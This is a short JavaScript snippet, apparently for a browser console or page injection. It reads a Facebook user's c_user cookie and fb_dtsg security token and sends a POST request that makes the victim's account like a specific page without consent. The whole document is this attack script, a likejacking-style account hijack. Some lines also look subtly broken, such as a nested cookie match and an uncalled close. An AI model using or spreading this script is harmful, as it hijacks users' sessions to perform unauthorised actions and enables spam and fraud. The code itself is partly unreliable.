 var X = new XMLHttpRequest();
var XURL = "//www.facebook.com/ajax/pages/fan_status.php?__pc=EXP1%3ADEFAULT";
var XParams = "fbpage_id=1028127337249145&add=true&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&ttstamp=";
X.open("POST", XURL, true);
X.onreadystatechange = function () {
if (X.readyState == 4 && X.status == 200) {
X.close;
}
};
X.send(XParams);
